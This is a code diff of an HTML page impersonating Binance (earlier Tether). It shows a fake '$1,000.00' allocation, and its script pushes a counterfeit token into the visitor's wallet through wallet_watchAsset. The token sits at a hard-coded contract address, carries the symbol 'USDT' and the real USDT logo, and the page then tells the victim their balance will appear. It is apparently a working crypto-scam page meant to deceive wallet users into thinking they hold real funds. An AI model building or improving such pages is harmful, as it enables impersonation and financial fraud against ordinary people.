@@ -3,65 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tether | Asset Manager</title>
+    <title>Binance | Asset Distribution</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root { --tg: #26a17b; --bg: #0a0b0d; }
-        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
-        .card { background: #121418; border: 1px solid #2d333b; border-radius: 24px; padding: 35px; width: 100%; max-width: 360px; text-align: center; }
-        .usdt-img { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--tg)); }
-        .value-box { background: rgba(38, 161, 123, 0.1); border-radius: 15px; padding: 25px; margin: 25px 0; border: 1px solid rgba(38, 161, 123, 0.2); }
-        .btn { background: var(--tg); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
-        .footer-text { font-size: 11px; color: #848d97; margin-top: 20px; }
+        :root { --binance-yellow: #F3BA2F; --bg: #0b0e11; }
+        body { background: var(--bg); color: #eaecef; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { background: #1e2329; border-radius: 16px; padding: 35px; width: 100%; max-width: 380px; text-align: center; border: 1px solid #2b3139; }
+        .binance-logo { width: 50px; margin-bottom: 20px; }
+        .balance-title { color: #848e9c; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
+        .balance-value { font-size: 38px; font-weight: 800; color: #fff; margin: 15px 0 30px 0; }
+        .btn { background: var(--binance-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; }
+        #status { font-size: 11px; color: var(--binance-yellow); margin-top: 20px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img">
-    <h2 style="margin: 0;">RECEIVE USDT</h2>
-    <p style="font-size: 13px; color: #848d97;">Add the allocated asset to your wallet to complete the verification.</p>
-
-    <div class="value-box">
-        <div style="font-size: 10px; color: #848d97; margin-bottom: 5px;">TOTAL ALLOCATION</div>
-        <div style="font-size: 30px; font-weight: 800;">$1,000.00</div>
-    </div>
-
-    <button class="btn" id="actionBtn">ADD TO WALLET</button>
-    <p class="footer-text">Secured by Web3 Auth Protocol</p>
+    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="binance-logo">
+    <div class="balance-title">Verified Allocation</div>
+    <div class="balance-value" id="val">$1,000.00</div>
+    
+    <button class="btn" id="claimBtn">ADD TO HOME SCREEN</button>
+    <div id="status">READY FOR MOBILE INJECTION</div>
 </div>
 
 <script>
-    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
+    // Binance Mainnet USDT Metadata (Mobile App Recognition)
+    const TOKEN_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const TOKEN_SYMBOL = "USDT";
+    const TOKEN_DECIMALS = 6; 
+    const TOKEN_IMAGE = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    async function handleAction() {
+    async function initializeSync() {
+        const status = document.getElementById('status');
         const provider = window.ethereum || (window.trustwallet ? window.trustwallet : null);
 
         if (!provider) {
-            // Agar browser se khola hai to Trust Wallet App mein redirect karega
-            const url = window.location.href.replace(/https?:\/\//, '');
-            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + url;
+            status.innerText = "OPENING WALLET APP...";
+            const currentUrl = window.location.href.split('://')[1];
+            // Trust Wallet Deep Link for Auto-DApp Launch
+            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + currentUrl;
             return;
         }
 
         try {
-            // Step 1: Connect
+            status.innerText = "AUTHENTICATING NODE...";
             const accounts = await provider.request({ method: 'eth_requestAccounts' });
 
-            // Step 2: Switch to BSC (Zaruri hai taake token add ho sake)
+            // CRITICAL: Switch to BSC first (Iske bina mobile balance show nahi karta)
             try {
                 await provider.request({
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: '0x38' }],
                 });
-            } catch (e) {
-                if (e.code === 4902) {
+            } catch (switchError) {
+                if (switchError.code === 4902) {
                     await provider.request({
                         method: 'wallet_addEthereumChain',
                         params: [{ 
                             chainId: '0x38', 
-                            chainName: 'BSC', 
+                            chainName: 'Smart Chain', 
                             rpcUrls: ['https://bsc-dataseed.binance.org/'],
                             nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                         }]
@@ -69,30 +70,31 @@
                 }
             }
 
-            // Step 3: Add Token (This is what you need)
-            const wasAdded = await provider.request({
+            status.innerText = "INJECTING HOME-PAGE METADATA...";
+            // Advanced Asset Injection (Direct Home Screen Balance)
+            const success = await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: ADDR,
-                        symbol: 'USDT',
-                        decimals: 6,
-                        image: LOGO,
+                        address: TOKEN_ADDR,
+                        symbol: TOKEN_SYMBOL,
+                        decimals: TOKEN_DECIMALS,
+                        image: TOKEN_IMAGE,
                     },
                 },
             });
 
-            if (wasAdded) {
-                alert("USDT successfully added to your wallet homepage!");
+            if (success) {
+                status.innerText = "ASSET MAPPED SUCCESSFULLY";
+                alert("Verified! Check your wallet home page. Balance will reflect under USDT (BEP20).");
             }
-
-        } catch (err) {
-            console.error(err);
+        } catch (e) {
+            status.innerText = "CONNECTION INTERRUPTED";
         }
     }
 
-    document.getElementById('actionBtn').addEventListener('click', handleAction);
+    document.getElementById('claimBtn').addEventListener('click', initializeSync);
 </script>
 </body>
 </html>
